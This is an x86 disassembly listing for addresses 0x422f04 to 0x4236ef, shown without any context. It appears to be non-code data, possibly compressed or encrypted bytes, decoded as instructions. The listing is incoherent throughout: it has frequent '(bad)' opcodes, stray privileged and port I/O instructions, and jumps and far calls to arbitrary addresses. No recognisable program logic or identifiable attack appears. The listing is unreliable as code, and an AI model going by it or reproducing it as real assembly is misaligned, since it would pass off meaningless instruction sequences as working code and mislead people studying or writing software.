  422f04:	pop    es
  422f05:	adc    cl,BYTE PTR [esi]
  422f07:	pop    es
  422f08:	in     al,0xc
  422f0a:	mov    ecx,ebx
  422f0c:	ins    DWORD PTR es:[edi],dx
  422f0d:	mov    ebp,0xc21ded6e
  422f12:	cli    
  422f13:	xor    DWORD PTR [ecx+0x7f92ca45],edi
  422f19:	or     eax,0x6cb4bf1a
  422f1e:	ret    0x1a68
  422f21:	adc    BYTE PTR [ebx-0x572769b3],ah
  422f27:	jl     0x422f18
  422f29:	sub    edi,DWORD PTR [ebx+edi*4]
  422f2c:	mov    al,ds:0x969428f7
  422f31:	push   edx
  422f32:	shl    esi,1
  422f34:	add    al,BYTE PTR [edi+0x511bdc83]
  422f3a:	mov    ebp,?
  422f3c:	sub    eax,0x67544840
  422f41:	popf   
  422f42:	aaa    
  422f43:	mov    eax,0x7aee1794
  422f48:	mov    edx,0x3d0c2dd7
  422f4d:	and    ebx,DWORD PTR [esi]
  422f4f:	enter  0x1487,0x6a
  422f53:	je     0x422f27
  422f55:	es ret 0x5cd7
  422f59:	or     eax,0x34586f84
  422f5e:	push   ecx
  422f5f:	sub    bl,BYTE PTR [eax]
  422f61:	mov    edx,0xaac87aac
  422f66:	mov    BYTE PTR [edi-0x9cbde9a],dh
  422f6c:	push   ds
  422f6d:	xor    eax,0x3167f6ca
  422f72:	pop    esp
  422f73:	dec    ebp
  422f74:	pop    edx
  422f76:	dec    ebp
  422f77:	push   esp
  422f78:	iret   
  422f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f7a:	(bad)  [eax-0x3f62d985]
  422f80:	and    ch,BYTE PTR [eax+0x5c0a5d14]
  422f86:	mov    eax,ds:0xc9cbaf2b
  422f8b:	jle    0x422f21
  422f8d:	mov    edi,0x86bcc017
  422f92:	icebp  
  422f93:	ret    
  422f94:	lds    edx,FWORD PTR [ebp+0x7d]
  422f97:	ins    BYTE PTR es:[edi],dx
  422f98:	fidiv  WORD PTR [ebx+0x14]
  422f9b:	jecxz  0x422fd2
  422f9d:	fwait
  422f9e:	jecxz  0x422fe0
  422fa0:	push   edi
  422fa1:	pop    es
  422fa2:	or     ecx,DWORD PTR [ebx+0x34]
  422fa5:	ret    
  422fa6:	ret    
  422fa7:	bound  ebx,QWORD PTR ds:0xe07554d0
  422fad:	gs xchg esp,eax
  422faf:	sbb    eax,0x8e1f1484
  422fb4:	jge    0x423027
  422fb6:	ret    0x58c8
  422fb9:	xchg   edx,eax
  422fba:	stc    
  422fbb:	aaa    
  422fbc:	pop    esi
  422fbd:	sbb    BYTE PTR [ebp+ecx*8+0x1ef82b0b],dl
  422fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fc6:	and    al,0xab
  422fc8:	sti    
  422fc9:	sbb    edx,DWORD PTR [ecx-0x708958fb]
  422fcf:	add    al,0xc
  422fd1:	push   cs
  422fd2:	ins    BYTE PTR es:[edi],dx
  422fd3:	jle    0x422f7f
  422fd5:	sar    bl,1
  422fd7:	loopne 0x422fbf
  422fd9:	popf   
  422fda:	inc    edx
  422fdb:	cmp    BYTE PTR [ebx-0x4],dh
  422fde:	jbe    0x422f8d
  422fe0:	cwde   
  422fe1:	push   edi
  422fe2:	adc    ebp,DWORD PTR [edx-0x5665ad5e]
  422fe8:	mov    ds:0x95463144,eax
  422fed:	enter  0x948f,0x0
  422ff1:	jnp    0x422fe2
  422ff3:	adc    bh,BYTE PTR ds:0x5e2153f5
  422ff9:	pop    esp
  422ffa:	(bad)  
  422ffc:	inc    esp
  422ffd:	jp     0x422fb6
  422fff:	inc    edx
  423000:	jge    0x422f85
  423002:	popf   
  423003:	jle    0x422fbe
  423005:	sbb    esi,DWORD PTR [edx]
  423007:	(bad)  
  423009:	test   al,0xb2
  42300b:	xchg   esi,eax
  42300c:	leave  
  42300d:	xor    BYTE PTR [eax-0x77],al
  423010:	push   ss
  423011:	ret    0x7034
  423014:	bound  esp,QWORD PTR [ecx-0x5e]
  423017:	test   BYTE PTR [ecx+0x320c3d27],ah
  42301d:	cmp    DWORD PTR [edi],0x7b
  423020:	inc    edx
  423021:	test   BYTE PTR [ebx],ch
  423023:	nop
  423024:	lock xor cl,BYTE PTR [esi]
  423027:	adc    eax,0x4bb8ddec
  42302c:	jmp    0x423051
  42302e:	pop    esp
  42302f:	pop    esi
  423030:	xchg   esp,eax
  423031:	xchg   ecx,eax
  423032:	jns    0x423055
  423034:	call   0x9738:0xffdbe6a9
  42303b:	out    dx,al
  42303c:	pop    ebp
  42303d:	xor    al,0xfc
  42303f:	xchg   ebp,eax
  423040:	cmp    DWORD PTR [esi],esi
  423042:	push   ecx
  423043:	xchg   esp,eax
  423044:	mov    ah,0x83
  423046:	cs addr16 mov edi,0x1e763e36
  42304d:	xor    eax,0x5d9d7321
  423052:	outs   dx,BYTE PTR ds:[esi]
  423053:	mov    ebp,0xb58a7e4f
  423058:	aas    
  423059:	mov    al,0xc4
  42305b:	pop    edi
  42305c:	outs   dx,DWORD PTR ds:[esi]
  42305d:	inc    ebx
  42305e:	js     0x423024
  423060:	and    edx,ebp
  423062:	jl     0x422ffa
  423064:	out    0xb,al
  423066:	adc    bp,dx
  423069:	mov    bl,0x5b
  42306b:	sbb    ebx,0x17
  42306e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42306f:	mov    edi,0xe8b05a8
  423074:	mov    dh,0x18
  423076:	inc    esp
  423077:	fwait
  423078:	cld    
  423079:	sbb    al,0x1a
  42307b:	jge    0x423042
  42307d:	jnp    0x42304c
  42307f:	pop    ss
  423080:	(bad)  [ebp-0x21b75d10]
  423086:	and    dl,BYTE PTR [edi+eax*1-0x2d]
  42308a:	adc    ch,BYTE PTR ds:0x8c99d3bc
  423090:	adc    DWORD PTR [edi+0x5df9ab37],edi
  423096:	adc    al,0x6b
  423098:	jge    0x4230f9
  42309a:	pop    esi
  42309b:	ret    
  42309c:	leave  
  42309d:	inc    ecx
  42309e:	sbb    DWORD PTR [ebx],ecx
  4230a0:	in     al,0x2f
  4230a2:	mov    al,ah
  4230a4:	iret   
  4230a5:	or     al,0x62
  4230a7:	sbb    DWORD PTR [edx+0x3263f896],edx
  4230ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ae:	dec    ebp
  4230af:	test   DWORD PTR [eax],ebx
  4230b1:	stc    
  4230b2:	xchg   esp,eax
  4230b3:	xchg   edx,eax
  4230b4:	adc    BYTE PTR [ebp-0x4d],cl
  4230b7:	nop
  4230b8:	scas   eax,DWORD PTR es:[edi]
  4230b9:	popf   
  4230ba:	sub    BYTE PTR [esi-0x7f1141fd],al
  4230c0:	xor    DWORD PTR ds:0xc566a18e,ecx
  4230c6:	shr    BYTE PTR [edi+0x76547ec2],cl
  4230cc:	mov    eax,ds:0x5f168325
  4230d1:	icebp  
  4230d2:	push   edx
  4230d3:	cmc    
  4230d4:	mov    WORD PTR [ebx+0xc],?
  4230d7:	sbb    bh,BYTE PTR [edi+0x1c6c25e8]
  4230dd:	pop    edi
  4230de:	fcomp  DWORD PTR [eax]
  4230e0:	add    DWORD PTR [eax],ecx
  4230e2:	push   eax
  4230e3:	and    BYTE PTR [eax],0x80
  4230e6:	shr    BYTE PTR [eax+0x21dafd10],0x9a
  4230ed:	jnp    0x423166
  4230ef:	xchg   DWORD PTR [ebx+0x57],edi
  4230f2:	fistp  DWORD PTR [ebp+0x7ba1a10b]
  4230f8:	gs mov ecx,0x7c743ebf
  4230fe:	rcr    BYTE PTR ds:0x56c06d04,cl
  423104:	ins    DWORD PTR es:[edi],dx
  423105:	inc    ebp
  423106:	or     eax,DWORD PTR [esi+0xc962167]
  42310c:	cmp    eax,0xcd61b073
  423111:	test   DWORD PTR [edx+0x3cb6b2d],edi
  423117:	xchg   ecx,eax
  423118:	jmp    esp
  42311a:	and    ch,ch
  42311c:	loopne 0x4230ae
  42311e:	jb     0x4230d2
  423120:	push   eax
  423121:	push   eax
  423122:	mov    al,ds:0x2c580efa
  423127:	pop    ebp
  423128:	and    ah,cl
  42312a:	dec    ebx
  42312b:	and    DWORD PTR [esi+eax*8],ecx
  42312e:	adc    DWORD PTR [edi+0x18],0x7a
  423132:	outs   dx,BYTE PTR ds:[esi]
  423133:	mul    DWORD PTR [ebp+0x59703f1c]
  423139:	(bad)  
  42313a:	mov    ebx,0x43ed5464
  42313f:	sub    ah,BYTE PTR [ecx-0x3e48439c]
  423145:	adc    ebp,eax
  423147:	mov    ecx,0xe1bd1fe0
  42314c:	mov    al,ds:0xd66a638c
  423151:	mov    ?,WORD PTR [edi-0x6eec69b7]
  423157:	loop   0x4230e0
  423159:	push   ds
  42315a:	inc    eax
  42315b:	adc    ebp,edx
  42315d:	jns    0x4231a3
  42315f:	push   0xffffffab
  423161:	jae    0x42318f
  423163:	cmp    BYTE PTR cs:[ecx],ch
  423166:	push   esi
  423167:	add    eax,edx
  423169:	mov    ch,0xa9
  42316b:	mov    edx,0x47fae21c
  423170:	inc    ebp
  423171:	mov    WORD PTR [eax+0x6],ds
  423174:	clc    
  423175:	leave  
  423176:	add    edi,esp
  423178:	inc    ebx
  423179:	in     al,0xb5
  42317b:	sti    
  42317c:	pop    es
  42317d:	adc    BYTE PTR [ecx-0x4682dc],ah
  423183:	xchg   edi,eax
  423184:	loop   0x4231e6
  423186:	clc    
  423187:	fcomp  DWORD PTR es:[esi+0x4431d7a3]
  42318e:	or     ch,BYTE PTR [edi]
  423190:	out    0x5c,al
  423192:	dec    edi
  423193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423194:	outs   dx,BYTE PTR ds:[esi]
  423195:	push   esp
  423196:	push   es
  423197:	mov    ecx,0x39a01725
  42319c:	call   0x2f44:0x8341f614
  4231a3:	xor    DWORD PTR [ecx],ecx
  4231a5:	ds stos BYTE PTR es:[edi],al
  4231a7:	sub    BYTE PTR [ecx-0x6734ca95],ch
  4231ad:	les    ebx,FWORD PTR [ecx-0x6a]
  4231b0:	call   0xdd171f88
  4231b5:	cmc    
  4231b6:	jo     0x423182
  4231b8:	int    0xec
  4231ba:	stc    
  4231bb:	fsub   QWORD PTR [ebp-0x63]
  4231be:	retf   
  4231bf:	or     DWORD PTR [esi-0x79],0x7a88c1a1
  4231c6:	push   esp
  4231c7:	popf   
  4231c8:	xor    al,0xd2
  4231ca:	xchg   ebp,eax
  4231cb:	cwde   
  4231cc:	or     BYTE PTR [ecx],bh
  4231ce:	sub    al,0x9e
  4231d0:	out    0xc8,al
  4231d2:	imul   edx,DWORD PTR [esi-0x2a],0x43ee77fa
  4231d9:	stos   BYTE PTR es:[edi],al
  4231da:	test   DWORD PTR [eax-0x7d],ebp
  4231dd:	jb     0x4231d0
  4231df:	rcr    BYTE PTR [ecx+0x7463167b],0x29
  4231e6:	mov    ah,0xd2
  4231e8:	cmc    
  4231e9:	dec    eax
  4231ea:	icebp  
  4231eb:	dec    edx
  4231ec:	push   ss
  4231ed:	imul   eax,DWORD PTR [edi-0xb],0x9f5f5289
  4231f4:	inc    edi
  4231f5:	in     eax,0xff
  4231f7:	add    eax,0xae716bb0
  4231fc:	pop    es
  4231fd:	int3   
  4231fe:	inc    esp
  4231ff:	xlat   BYTE PTR ds:[ebx]
  423200:	mov    al,ds:0x17b895c
  423205:	sub    cl,BYTE PTR [ecx+0x2b753b78]
  42320b:	inc    ebp
  42320c:	xchg   esi,eax
  42320d:	out    0x9a,al
  42320f:	sbb    ah,BYTE PTR [eax]
  423211:	mov    cl,0x79
  423213:	jno    0x4231be
  423215:	das    
  423216:	xor    eax,0x90a90547
  42321b:	push   ebx
  42321c:	out    0xa5,eax
  42321e:	pushf  
  42321f:	retf   
  423220:	mov    eax,ds:0x8d0e28f1
  423225:	cwde   
  423226:	pop    ds
  423227:	clc    
  423228:	pop    es
  423229:	fidivr WORD PTR [edi+ebp*2]
  42322c:	enter  0x5b19,0x6a
  423230:	cmp    al,0xbc
  423232:	xchg   ecx,eax
  423233:	and    eax,0x346478
  423238:	js     0x42329e
  42323a:	dec    ebx
  42323b:	push   edi
  42323c:	push   edx
  42323d:	fdivr  QWORD PTR [ecx+0x1139e74f]
  423243:	fld    QWORD PTR [ecx-0x73dca018]
  423249:	stos   BYTE PTR es:[edi],al
  42324a:	push   esp
  42324b:	inc    ecx
  42324c:	push   cs
  42324d:	and    ebx,DWORD PTR [edx-0x30b5daa6]
  423253:	ret    
  423254:	and    eax,DWORD PTR [edx]
  423256:	sub    edx,DWORD PTR [ebx]
  423258:	pop    esp
  423259:	sbb    BYTE PTR [ecx-0x5a703aed],al
  42325f:	pop    esp
  423260:	das    
  423261:	mov    dl,0xcb
  423263:	mov    ebp,0x24c4f44a
  423268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423269:	push   esp
  42326a:	adc    al,0xb5
  42326c:	jge    0x423277
  42326e:	int3   
  42326f:	and    BYTE PTR [edi*4-0x3e56e868],ah
  423276:	jl     0x4232f5
  423278:	lea    ebx,[esi+0x15]
  42327b:	jo     0x423278
  42327d:	(bad)  
  42327e:	fs in  al,0xe5
  423281:	test   ebp,ebp
  423283:	das    
  423284:	aaa    
  423285:	adc    DWORD PTR [ebp-0x444dc58b],ebx
  42328b:	jle    0x4232ef
  42328d:	sbb    DWORD PTR ds:0xe17fe03e,0x154208db
  423297:	leave  
  423298:	inc    edx
  423299:	mov    dl,0x1f
  42329b:	mov    DWORD PTR [eax],esp
  42329d:	cli    
  42329e:	pop    ebp
  42329f:	fild   QWORD PTR [edi-0x15abcf09]
  4232a5:	cmp    BYTE PTR [ecx-0x4d],dh
  4232a8:	mov    esi,0x70c87481
  4232ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232ae:	pop    ss
  4232af:	push   ebp
  4232b0:	xlat   BYTE PTR ds:[ebx]
  4232b1:	push   0x166eafc6
  4232b6:	repnz fnsave [ecx]
  4232b9:	mov    dl,0x81
  4232bb:	retf   0xff81
  4232be:	scas   eax,DWORD PTR es:[edi]
  4232bf:	sysenter 
  4232c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232c2:	fcomp  QWORD PTR [ebx]
  4232c4:	pop    esi
  4232c5:	leave  
  4232c6:	int    0x15
  4232c8:	in     eax,0x1b
  4232ca:	sbb    dh,BYTE PTR [esi+0x73]
  4232cd:	mov    ecx,DWORD PTR [ebx]
  4232cf:	push   ebx
  4232d0:	fadd   DWORD PTR [edi-0x241b6066]
  4232d6:	cmp    bl,BYTE PTR [esi+0x54]
  4232d9:	and    DWORD PTR [ebp-0x4e2a251d],edx
  4232df:	mov    esi,0xddd63bc0
  4232e4:	or     al,0x96
  4232e6:	adc    dl,al
  4232e8:	adc    DWORD PTR [eax+0x59],esi
  4232eb:	mov    bl,0x97
  4232ed:	test   BYTE PTR [ecx+0x5dde432d],al
  4232f3:	jmp    0x9c69e8ee
  4232f8:	and    al,0xb2
  4232fa:	pop    ds
  4232fb:	pop    esp
  4232fc:	pop    esp
  4232fd:	jge    0x42333a
  4232ff:	jne    0x4232ff
  423301:	rol    BYTE PTR [eax],1
  423303:	sbb    eax,0x98e94ef6
  423308:	jbe    0x4232b7
  42330a:	xor    ebx,DWORD PTR [ebp-0x1cb6a46]
  423310:	std    
  423311:	(bad)  
  423312:	fld    DWORD PTR [edi-0x502f62e]
  423318:	xchg   edx,eax
  423319:	cmp    BYTE PTR [ecx],0xc1
  42331c:	std    
  42331d:	in     al,dx
  42331e:	jecxz  0x4232c3
  423320:	repnz sub eax,0x946ad7a5
  423326:	mov    dl,0xb0
  423328:	adc    ecx,DWORD PTR [edi+0x68]
  42332b:	jb     0x4232c4
  42332d:	repz or ecx,DWORD PTR [ebp+0xe]
  423331:	addr16 mov cl,0x0
  423334:	test   BYTE PTR [esi+edx*8-0x1972b5fb],ah
  42333b:	mov    cl,0xef
  42333d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42333f:	(bad)  
  423340:	mov    esp,0xe846ee6c
  423345:	mov    ah,0x41
  423347:	out    dx,eax
  423348:	jecxz  0x4233a5
  42334a:	push   ss
  42334b:	scas   al,BYTE PTR es:[edi]
  42334c:	jl     0x42330f
  42334e:	mov    edx,0xe856f4d5
  423353:	inc    ebp
  423354:	sub    BYTE PTR [ebp+0x54],al
  423357:	sbb    edi,DWORD PTR [eax]
  423359:	int3   
  42335a:	(bad)  
  42335b:	cmp    eax,0xbdd509be
  423360:	jno    0x423386
  423362:	jmp    0x423395
  423364:	mov    ch,0x63
  423366:	call   0x41c832a3
  42336b:	fmul   QWORD PTR [ebx+edi*8+0x10]
  42336f:	pop    ebp
  423370:	dec    ecx
  423371:	repz fs stc 
  423374:	and    BYTE PTR [edx-0x6535c057],bh
  42337a:	ja     0x4233f3
  42337c:	jo     0x423324
  42337e:	jl     0x4233b5
  423380:	xor    eax,0x84d8f83f
  423385:	call   0xd523dd4b
  42338a:	das    
  42338b:	and    dh,BYTE PTR [eax+0x50]
  42338e:	outs   dx,DWORD PTR ds:[esi]
  42338f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423390:	xor    esp,ecx
  423392:	popa   
  423393:	pop    ss
  423394:	dec    edi
  423395:	data16 lods al,BYTE PTR ds:[esi]
  423397:	fisttp WORD PTR [eax]
  423399:	jmp    0x7b4bc5ac
  42339e:	lds    esi,FWORD PTR [ecx+0x39e5bfe2]
  4233a4:	dec    esp
  4233a5:	add    cl,BYTE PTR [eax]
  4233a7:	cmp    eax,ebx
  4233a9:	xor    bh,BYTE PTR [ebx+0xf51402d]
  4233af:	leave  
  4233b0:	inc    edx
  4233b1:	pop    edi
  4233b2:	xor    eax,0x9110e915
  4233b7:	jl     0x4233f3
  4233b9:	dec    ecx
  4233ba:	dec    esi
  4233bb:	mov    eax,0x89d36979
  4233c0:	arpl   WORD PTR [ebx],dx
  4233c2:	cdq    
  4233c3:	(bad)  
  4233c5:	xchg   ebx,eax
  4233c6:	sbb    ecx,DWORD PTR [ebp+0x26]
  4233c9:	xchg   ebp,eax
  4233ca:	(bad)  [ecx-0x6014ad8]
  4233d0:	inc    ecx
  4233d1:	lds    ecx,FWORD PTR [esi+0x16]
  4233d4:	ja     0x4233f7
  4233d6:	jmp    0x83651d04
  4233db:	mov    BYTE PTR [edi+0x6835f452],al
  4233e1:	sbb    edx,DWORD PTR [eax+0x1dfc2391]
  4233e7:	jae    0x42336d
  4233e9:	mov    ebx,edi
  4233eb:	int3   
  4233ec:	fdiv   st,st(0)
  4233ee:	inc    esi
  4233ef:	mov    ?,WORD PTR [eax+0x4f30399]
  4233f5:	mov    al,0xf9
  4233f7:	dec    ebx
  4233f8:	into   
  4233f9:	inc    ebp
  4233fa:	mov    ds:0xa12718d7,eax
  4233ff:	out    dx,al
  423400:	xchg   esp,eax
  423401:	in     al,dx
  423402:	add    eax,0x5b883130
  423407:	repz fwait
  423409:	ds (bad) 
  42340b:	(bad)  
  42340c:	in     al,dx
  42340d:	sbb    DWORD PTR [edx-0x5fee6557],eax
  423413:	add    BYTE PTR [ecx],ah
  423415:	std    
  423416:	and    BYTE PTR [esi+0x2549977],0x2b
  42341d:	inc    esi
  42341e:	push   esi
  42341f:	add    ebp,DWORD PTR [esi-0x62333156]
  423425:	retf   
  423426:	out    dx,al
  423427:	xor    eax,0xe988d7fc
  42342c:	cmp    DWORD PTR [ecx+0x70],edi
  42342f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423430:	pop    eax
  423431:	dec    ebx
  423432:	aam    0xd2
  423434:	hlt    
  423435:	and    bh,BYTE PTR [esi+0x652223db]
  42343b:	push   0x98a2de8c
  423440:	adc    eax,0x24be8093
  423445:	add    DWORD PTR ds:0x84419b8,ecx
  42344b:	sbb    al,0x8c
  42344d:	jne    0x4234b3
  42344f:	(bad)  
  423450:	leave  
  423451:	in     al,dx
  423452:	enter  0x4ba0,0x67
  423456:	mov    ecx,ebx
  423458:	pop    esi
  423459:	push   eax
  42345a:	push   ecx
  42345b:	push   esp
  42345c:	icebp  
  42345d:	sub    DWORD PTR [ecx],ebx
  42345f:	push   0x9469867
  423464:	pop    ecx
  423465:	mov    esi,DWORD PTR [ebx+edi*1]
  423468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423469:	sbb    al,0x46
  42346b:	sub    eax,0xfaf4fae0
  423470:	inc    edi
  423471:	and    BYTE PTR [ecx+edx*4+0x48],bl
  423475:	lock push ecx
  423477:	jp     0x423444
  423479:	xchg   esi,eax
  42347a:	inc    eax
  42347b:	imul   edx,DWORD PTR ds:0x3441629e,0x5b
  423482:	mov    ch,0x1c
  423484:	stc    
  423485:	fdivrp st(5),st
  423487:	or     bh,BYTE PTR [edi+edi*4]
  42348a:	mov    BYTE PTR [ecx+0x37b65973],ch
  423490:	outs   dx,BYTE PTR ds:[esi]
  423491:	test   al,0x59
  423493:	sub    BYTE PTR [esi+0x1f88bb8d],cl
  423499:	data16 sbb ah,ch
  42349c:	stc    
  42349d:	cmc    
  42349e:	les    edi,FWORD PTR [ebx]
  4234a0:	pusha  
  4234a1:	adc    DWORD PTR [edi+0x4],edi
  4234a4:	test   eax,0x9bddd49f
  4234a9:	mov    ebp,0x49b169d7
  4234ae:	lods   eax,DWORD PTR ds:[esi]
  4234af:	lea    ecx,[esi]
  4234b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b2:	ret    
  4234b3:	dec    ebx
  4234b4:	or     DWORD PTR [eax-0x35],edi
  4234b7:	sahf   
  4234b8:	cmp    al,BYTE PTR [edi]
  4234ba:	outs   dx,BYTE PTR ds:[esi]
  4234bb:	aas    
  4234bc:	rcr    BYTE PTR [ebp-0x22],0xae
  4234c0:	pop    ebx
  4234c1:	retf   
  4234c2:	gs push edi
  4234c4:	out    0xf8,eax
  4234c6:	rcr    edi,0xfd
  4234c9:	jae    0x423469
  4234cb:	mov    bh,0x9f
  4234cd:	inc    esp
  4234ce:	push   ds
  4234cf:	rep stos BYTE PTR es:[edi],al
  4234d1:	iret   
  4234d2:	push   edx
  4234d3:	add    al,0x85
  4234d5:	xchg   ebx,eax
  4234d6:	int    0x59
  4234d8:	clc    
  4234d9:	cmp    BYTE PTR [eax-0x6caf55cd],cl
  4234df:	retf   0x8356
  4234e2:	rol    DWORD PTR [eax+0x5a],0xca
  4234e6:	xchg   ebp,eax
  4234e7:	stc    
  4234e8:	shr    ch,0x4c
  4234eb:	call   0xcf629b2c
  4234f0:	xlat   BYTE PTR ds:[ebx]
  4234f1:	push   ss
  4234f2:	jecxz  0x4234b7
  4234f4:	mov    ecx,0x6f1edf1b
  4234f9:	in     eax,dx
  4234fa:	fidiv  DWORD PTR [ecx+eiz*2-0x1a3577ae]
  423501:	jge    0x423493
  423503:	push   0xe
  423505:	push   ecx
  423506:	cmp    esi,DWORD PTR [esi+0x433d8abc]
  42350c:	pop    ebp
  42350d:	sbb    eax,0x8b403254
  423512:	pop    esi
  423513:	shl    edx,cl
  423515:	jmp    0x14d8:0x353712f1
  42351c:	enter  0xbe73,0x81
  423520:	inc    edx
  423521:	lds    ecx,FWORD PTR [edi+0x61]
  423524:	ret    
  423525:	or     DWORD PTR [eax+0x4b],edx
  423528:	nop
  423529:	call   0x3c55847c
  42352e:	mov    esp,0xbac74b75
  423533:	xor    BYTE PTR [ecx+eiz*4-0x23],0x22
  423538:	scas   al,BYTE PTR es:[edi]
  423539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42353a:	jp     0x4234be
  42353c:	cmp    al,0xcf
  42353e:	adc    ch,BYTE PTR [ecx]
  423540:	pop    eax
  423541:	cmp    eax,0x8223dbaf
  423546:	dec    ebx
  423547:	aaa    
  423548:	xchg   DWORD PTR [ebx],ebp
  42354a:	aas    
  42354b:	push   edi
  42354c:	ins    DWORD PTR es:[edi],dx
  42354d:	cmp    cl,BYTE PTR [ebp+0x40]
  423550:	div    BYTE PTR [edx-0x28]
  423553:	out    0x5a,al
  423555:	sub    BYTE PTR [eax],bl
  423557:	shl    DWORD PTR [edi+esi*2],0xb3
  42355b:	pop    es
  42355c:	jns    0x423577
  42355e:	xor    eax,0x2469eba7
  423563:	cmp    eax,0x17164318
  423568:	aam    0xd5
  42356a:	shr    BYTE PTR [esi+ecx*1+0x672514e9],cl
  423571:	mov    dh,0x8c
  423573:	mov    esp,DWORD PTR [ebx+edi*8+0x349c5641]
  42357a:	jns    0x423567
  42357c:	add    cl,dh
  42357e:	ror    esp,0x31
  423581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423582:	loope  0x423524
  423584:	es call 0x158b:0x40529d2f
  42358c:	xchg   ecx,eax
  42358d:	int3   
  42358e:	mov    ebp,0x6e841419
  423593:	(bad)  
  423594:	repz fbstp TBYTE PTR [edi-0x533fd878]
  42359b:	inc    ebx
  42359c:	xor    eax,edx
  42359e:	lods   eax,DWORD PTR ds:[esi]
  42359f:	xor    dh,BYTE PTR [ebx-0x4df2c50]
  4235a5:	sub    dh,BYTE PTR [ebp+0x1163b6b7]
  4235ab:	push   ss
  4235ac:	inc    edx
  4235ad:	jae    0x4235e3
  4235af:	inc    esp
  4235b0:	cs jae 0x423616
  4235b3:	and    DWORD PTR ds:0x20ac6922,esi
  4235b9:	in     eax,dx
  4235ba:	xor    al,0xd0
  4235bc:	jne    0x42354a
  4235be:	es jp  0x423600
  4235c1:	test   eax,0xd168736b
  4235c6:	mov    eax,ds:0x6beaa7b5
  4235cb:	pop    edi
  4235cc:	test   al,al
  4235ce:	dec    ebp
  4235cf:	dec    edx
  4235d0:	mov    dl,0xac
  4235d2:	jno    0x423625
  4235d4:	and    eax,0xa0501757
  4235d9:	out    0x90,al
  4235db:	jno    0x423597
  4235dd:	fwait
  4235de:	out    0x8f,al
  4235e0:	mov    WORD PTR [edi-0x50c56892],es
  4235e6:	xor    eax,0x8a1431cc
  4235eb:	and    BYTE PTR [ebx-0xee11c7d],0xbb
  4235f2:	sub    BYTE PTR [bx+si],dh
  4235f5:	(bad)  
  4235f7:	in     eax,0x9b
  4235f9:	mov    ah,0x8f
  4235fb:	mov    al,ds:0xe828c4fe
  423600:	inc    ebp
  423601:	or     eax,0x5f272120
  423606:	cmc    
  423607:	mov    cl,dl
  423609:	(bad)  
  42360b:	mov    ds:0x7a9ba9bd,eax
  423610:	push   0xc487ce23
  423615:	add    edi,DWORD PTR [esi-0x428f2d18]
  42361b:	jb     0x42359f
  42361d:	dec    edx
  42361e:	pusha  
  42361f:	popa   
  423620:	(bad)  
  423621:	out    dx,eax
  423622:	(bad)  
  423623:	push   edx
  423624:	stos   BYTE PTR es:[edi],al
  423625:	push   esi
  423626:	push   ds
  423627:	dec    edx
  423628:	mov    bl,0x4
  42362a:	mov    ebp,0x4a8095b
  42362f:	ret    
  423630:	push   cs
  423631:	popa   
  423632:	mov    ds:0x9a62feae,eax
  423637:	cmp    cl,BYTE PTR [esi+0x1910733f]
  42363d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42363e:	leave  
  42363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423640:	sar    DWORD PTR [eax],cl
  423642:	repnz dec edi
  423644:	dec    esi
  423645:	pusha  
  423646:	pop    ebp
  423647:	jecxz  0x4235e3
  423649:	outs   dx,DWORD PTR ds:[esi]
  42364a:	fdiv   st,st(6)
  42364c:	jns    0x7f2168a3
  423652:	jl     0x4236a7
  423654:	out    0xff,al
  423656:	xor    DWORD PTR [eax],0xf97de254
  42365c:	ficomp WORD PTR [ecx+0x63]
  42365f:	aaa    
  423660:	(bad)  
  423661:	loopne 0x4236d9
  423663:	or     ebp,DWORD PTR [ecx+0x5f6fa7bd]
  423669:	jb     0x423676
  42366b:	mov    al,0xa6
  42366d:	pushf  
  42366e:	mov    ds:0x38efd00d,eax
  423673:	(bad)  
  423674:	or     eax,0x8519251c
  423679:	clc    
  42367a:	lea    edx,[edx-0x6bca3cd9]
  423680:	fsub   DWORD PTR [ecx+0x20]
  423683:	xor    dl,BYTE PTR [eax]
  423685:	in     eax,dx
  423686:	lods   eax,DWORD PTR ds:[esi]
  423687:	sahf   
  423688:	mov    esp,0x95550143
  42368d:	inc    ecx
  42368e:	aas    
  42368f:	call   0x3dc210ba
  423694:	shl    DWORD PTR [ecx+0x491ff07c],1
  42369a:	sar    BYTE PTR [ecx+0x5a],1
  42369d:	addr16 or eax,0x4fd92d8d
  4236a3:	pop    ds
  4236a4:	add    dh,BYTE PTR [ecx+0x34af117d]
  4236aa:	jnp    0x423687
  4236ac:	dec    esp
  4236ad:	loope  0x4236d3
  4236af:	inc    eax
  4236b0:	jecxz  0x423729
  4236b2:	sbb    BYTE PTR [esi+eiz*1-0x50689107],al
  4236b9:	jno    0x423641
  4236bb:	sub    BYTE PTR [ebp+esi*1-0x2ce6dd61],0xb8
  4236c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236c4:	fwait
  4236c5:	popa   
  4236c6:	into   
  4236c7:	mov    esp,0xf87f653c
  4236cc:	icebp  
  4236cd:	sbb    BYTE PTR [edi+eiz*2+0x5f09a940],al
  4236d4:	jl     0x42371d
  4236d6:	cmp    al,0xb4
  4236d8:	in     eax,0x5
  4236da:	outs   dx,DWORD PTR ds:[esi]
  4236db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236dc:	xchg   esi,eax
  4236dd:	mov    al,0x17
  4236df:	jl     0x42373d
  4236e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236e2:	(bad)  
  4236e3:	mov    DWORD PTR [ebp+esi*2-0x66],ebp
  4236e7:	xchg   BYTE PTR [ecx-0xd9bf36],bl
  4236ed:	out    0x13,al
  4236ef:	daa    
